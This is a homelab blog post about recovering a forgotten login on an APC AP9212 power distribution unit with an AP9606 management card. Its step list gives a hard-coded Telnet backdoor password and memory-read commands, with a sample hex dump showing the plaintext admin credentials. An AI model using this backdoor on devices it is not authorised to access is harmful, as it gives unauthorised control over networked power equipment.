---
layout: post
title: Hacking your way into an APC PDU
---

So I recently bought an APC AP9212 switched pdu for my homelab. Together with the AP9606 management card you are able to remotely switch outlets on and off. It had a really great price and fits perfectly as it has shiny blinkenlights at the front for monitoring and all the outlets at the back, so most of the cables can be hidden....

I however had a huge problem. I didn't know the device's ip address, nor the password. Normally you would have to get a special serial cable to reset the device. (the reset button only reboots the device and initiates the reset process, which then has to be finished over serial) Of course I don't have such special serial cable... so I searched for a different way...

I got the ip address by connecting the pdu via LAN to my Laptop and then scanning the ethernet interface with Wireshark. Every few minutes/seconds the pdu scans the network and thereby reveals it's IP...

And then I found [this](https://www.securityfocus.com/archive/1/354230/30/0/threaded), a discussion about a backdoor on said management card! The guide was pretty simple:

1. connect via Telnet

2. login with any username and this password: `TENmanUFactOryPOWER`

3. 13 + Enter

4. 1d0 + Enter

5. this reads out the username and password (which is stored in plain text). In this example the username is "admin" and password "BBCCDDEEF". It should look something like this:

```
01D0 FF 50 46 61 70 63 00 FF .PFapc..
01D8 FF FF FF FF FF FF 42 42 ......BB
01E0 43 43 44 44 45 45 46 00 CCDDEEF.
01E8 FF 64 65 76 69 63 65 00 .device.
01F0 FF FF FF FF 41 41 41 41 ....AAAA
01F8 42 42 42 42 42 00 FF 61 BBBBB..a
0200 64 6D 69 6E 20 75 73 65 dmin use
0208 72 20 70 68 72 61 73 65 r phrase
0210 00 FF FF FF FF FF FF FF ........
0218 FF FF FF FF FF FF FF FF ........
0220 64 65 76 69 63 65 20 75 device u
0228 73 65 72 20 70 68 72 61 ser phra
0230 73 65 00 FF FF FF FF FF se......
0238 FF FF FF FF FF FF FF FF ........
0240 FF 00 00 FF FF FF FF 21 .......!
0248 56 00 00 00 00 00 00 55 V......U
```

6. Ctrl+A to exit

7. Login to it again via telnet/http with the username and password you just got and change the parameters you want to change.


**Voila!** I hope this can help you as well...
